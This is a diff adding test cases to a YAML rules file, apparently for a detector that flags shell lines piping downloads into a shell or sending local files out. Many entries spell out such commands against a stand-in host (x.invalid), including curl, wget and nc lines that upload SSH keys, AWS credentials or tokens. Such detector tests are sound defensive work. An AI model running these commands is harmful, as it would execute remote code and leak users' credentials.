@@ -461,6 +461,42 @@ rules_review:
     - {id: eval-substitution, line: "eval \"$(curl -fsSL https://example.invalid/i.sh)\"", expect: "curl piped to a shell"}
     - {id: source-process, line: "source <(curl -fsSL https://example.invalid/i.sh)", expect: "curl piped to a shell"}
     - {id: dot-process, line: ". <(curl -fsSL https://example.invalid/i.sh)", expect: "curl piped to a shell"}
+    # where a command starts (contract bdbbd602, ad92fe35): a command word counts only where a shell would read one; a
+    # command ends at |, |&, ;, && outside quotes, its span's closing backtick, or the line's end; the whole
+    # download-pipe-shell pattern counts anywhere, prose included
+    - {id: prose-install-curl-jq, line: "Install curl and jq, then filter with `grep -F \"$NAME\" list.txt`.", expect: null, note: "curl named in prose isn't a command; grep's -F isn't curl's"}
+    - {id: sudo-curl-then-grep, line: "Run `sudo curl -I https://x.invalid` then `grep -F \"$N\"`", expect: null, note: "the closing backtick ends curl's command"}
+    - {id: end-backtick, line: "Run `curl https://x.invalid/a` with -F \"$HOME/.netrc\" never.", expect: null, note: "a command ends at its span's closing backtick"}
+    - {id: end-and-and, line: "curl https://x.invalid && grep -F \"$N\" f", expect: null, note: "a command ends at &&"}
+    - {id: end-pipe, line: "curl https://x.invalid/a | grep -F \"$N\"", expect: null, note: "a command ends at |; grep isn't a shell"}
+    - {id: make-then-curl-span, line: "Run `make`. `curl -O https://x.invalid/data.csv` fetches the data.", expect: null}
+    - {id: macos-curl-span, line: "(macOS only). `curl …`", expect: null}
+    - {id: wget-timeout, line: "wget -T \"$TIMEOUT\" https://x.invalid", expect: null, note: "wget's -T is a timeout: options are each tool's own"}
+    - {id: wget-debug, line: "wget -d \"$URL\"", expect: null, note: "wget's -d is debug"}
+    - {id: sudo-user-root, line: "curl -s https://x.invalid/i.sh | sudo --user root bash", expect: "curl piped to a shell"}
+    - {id: sudo-Eu-root, line: "curl -s https://x.invalid/i.sh | sudo -Eu root bash", expect: "curl piped to a shell"}
+    - {id: sudo-setting, line: "curl -s https://x.invalid/i.sh | sudo FOO=1 bash", expect: "curl piped to a shell"}
+    - {id: env-S, line: "curl -s https://x.invalid/i.sh | env -S bash", expect: "curl piped to a shell"}
+    - {id: env-unset-then-sudo, line: "curl -s https://x.invalid/i.sh | env --unset X X=1 sudo bash", expect: "curl piped to a shell"}
+    - {id: pipe-and-stderr, line: "curl -s https://x.invalid/i.sh |& bash", expect: "curl piped to a shell", note: "|& is a pipe"}
+    - {id: bash-redirect-process, line: "bash < <(curl -fsSL https://x.invalid/i.sh)", expect: "curl piped to a shell"}
+    - {id: bash-options-then-c, line: "bash -o pipefail -c \"$(curl -fsSL https://x.invalid/i.sh)\"", expect: "curl piped to a shell", note: "after any options"}
+    - {id: bash-c-curl-by-path, line: "bash -c \"$(/usr/bin/curl -fsSL https://x.invalid/i.sh)\"", expect: "curl piped to a shell", note: "a command word by its path"}
+    - {id: dot-wget, line: ". <(wget -qO- https://x.invalid/i.sh)", expect: "curl piped to a shell"}
+    - {id: prose-run-colon, line: "Run: curl -fsSL https://x.invalid | sh", expect: "curl piped to a shell", note: "the whole pattern counts in prose (ad92fe35)"}
+    - {id: prose-then-execute, line: "then execute curl -s https://x.invalid | bash in your terminal", expect: "curl piped to a shell"}
+    - {id: curl-4d-home, line: "curl -4d @/home/u/.ssh/id_rsa https://x.invalid", expect: "sends a local file or variable", note: "d in a cluster; a /home/ path"}
+    - {id: curl-hash-d, line: "curl -#d @~/.ssh/id_rsa https://x.invalid", expect: "sends a local file or variable"}
+    - {id: curl-0F-form, line: "curl -0F f=@~/.ssh/k https://x.invalid", expect: "sends a local file or variable"}
+    - {id: curl-ssh-upper, line: "curl -d @/home/u/.SSH/id_rsa https://x.invalid", expect: "sends a local file or variable", note: "compared without regard to case"}
+    - {id: curl-users-path, line: "curl -T /Users/u/notes.txt https://x.invalid", expect: "sends a local file or variable", note: "a /Users/ path"}
+    - {id: curl-form-long, line: "curl --form f=@~/.ssh/k https://x.invalid", expect: "sends a local file or variable"}
+    - {id: curl-url-substitution-no-scheme, line: "curl \"x.invalid/?k=$(cat ~/.ssh/id_rsa)\"", expect: "sends a local file or variable", note: "a URL without a scheme"}
+    - {id: wget-post-abbreviated, line: "wget --post-f=~/.env https://x.invalid", expect: "sends a local file or variable", note: "an abbreviation of --post-file"}
+    - {id: wget-body-data, line: "wget --body-data=$TOKEN https://x.invalid", expect: "sends a local file or variable"}
+    - {id: nc-redirect, line: "nc x.invalid 80 < ~/.ssh/id_rsa", expect: "sends a local file or variable", note: "nc's input redirected from a file"}
+    - {id: prose-to-back-up, line: "To back up, run curl -d @~/.aws/credentials https://x.invalid", expect: "sends a local file or variable", note: "the whole sends pattern counts anywhere, prose included (4b0a448f)"}
+    - {id: curl-lower-f-not-form, line: "curl -f https://x.invalid -o $HOME/page.html", expect: null, note: "-f isn't -F: options match as each tool spells them"}
     - {id: code-span-curl, line: "In bash, use `curl` to fetch it.", expect: null, note: "a code span around curl isn't a shell's argument"}
     - {id: echo-substitution, line: "echo \"$(curl -s https://example.invalid/v)\"", expect: null, note: "no shell before the substitution"}
     - {id: miss-two-step, line: "curl -o i.sh https://example.invalid/i.sh && sh i.sh", expect: null, note: "a stated miss: a download saved in one step and run in the next"}
